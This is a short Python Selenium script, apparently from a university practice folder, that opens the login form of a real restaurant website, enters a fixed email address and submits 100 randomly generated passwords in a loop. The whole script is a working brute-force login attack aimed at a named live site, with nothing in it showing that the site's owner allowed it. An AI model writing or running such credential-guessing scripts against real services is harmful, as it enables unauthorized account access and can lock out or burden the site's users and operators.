from selenium.webdriver.common.keys import Keys
from selenium import webdriver
import time
import string, random

driver = webdriver.Edge(executable_path=r"D:\Universidad\2021\Practica\Chrome_driver\msedgedriver.exe")
driver.get("https://www.niusushi.cl")
driver.execute_script('document.querySelector("#signin-signout").click()')
dicc=string.ascii_lowercase+string.digits
mail=driver.find_element_by_xpath('//*[@id="login-email"]')
mail.send_keys("vcroninr_f885t@gexik.com")
time.sleep(1)
for i in range(100):
    passw = ''.join(random.choice(dicc) for j in range(random.randrange(5,50)))
    time.sleep(1)
   
    clave=driver.find_element_by_xpath('//*[@id="login-password"]')
    time.sleep(1)
    clave.send_keys(passw)
    time.sleep(1)
    driver.execute_script('document.querySelector("#login-btn").click()')
    time.sleep(5)
    clave.clear()


driver.close()
